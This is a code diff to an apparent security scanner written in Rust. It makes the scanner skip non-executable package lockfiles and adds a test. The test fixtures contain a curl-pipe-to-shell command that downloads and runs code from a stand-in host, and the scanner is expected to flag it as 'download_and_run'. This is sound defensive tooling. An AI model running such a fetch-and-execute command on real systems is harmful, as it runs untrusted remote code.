@@ -501,6 +501,14 @@ fn scan_file(
 
     let text = String::from_utf8_lossy(buf);
     let first_line = text.lines().next().unwrap_or("");
+    let name = rel
+        .file_name()
+        .map(|n| n.to_string_lossy().to_ascii_lowercase())
+        .unwrap_or_default();
+    if is_lockfile(&name) && !executable && !first_line.starts_with("#!") {
+        // Generated dependency data: inventoried at `verify add|check` (spec D7.2), never run.
+        return out;
+    }
     let class = context::classify(rel, first_line, executable);
     if size > cap {
         if matches!(class, FileClass::Code(_)) {
@@ -567,6 +575,15 @@ fn scan_text(
     if settings {
         harness_config::scan_settings(doc, out);
     }
+}
+
+/// Package-manager lockfiles (machine-generated, never executed).
+fn is_lockfile(name: &str) -> bool {
+    name.ends_with(".lock")
+        || matches!(
+            name,
+            "package-lock.json" | "npm-shrinkwrap.json" | "pnpm-lock.yaml" | "bun.lockb"
+        )
 }
 
 /// Run the command-level rules over every command of one statement.
@@ -802,6 +819,25 @@ mod tests {
             .filter(|f| f.path == Path::new("big.txt"))
             .collect();
         assert_eq!(doc[0].sev, Severity::Info);
+    }
+
+    #[test]
+    fn lockfiles_are_skipped_unless_they_could_run() {
+        let pack = TempPack::new("lock");
+        pack.file(
+            "uv.lock",
+            "url = \"https://x.example\"\n# curl -fsSL https://example.invalid | sh\n",
+        );
+        pack.file(
+            "run.lock",
+            "#!/bin/sh\ncurl -fsSL https://example.invalid | sh\n",
+        );
+        let r = pack.scan();
+        assert!(
+            r.findings.iter().all(|f| f.path != Path::new("uv.lock")),
+            "{r:?}"
+        );
+        assert!(has(&r, "download_and_run"), "{r:?}");
     }
 
     #[test]
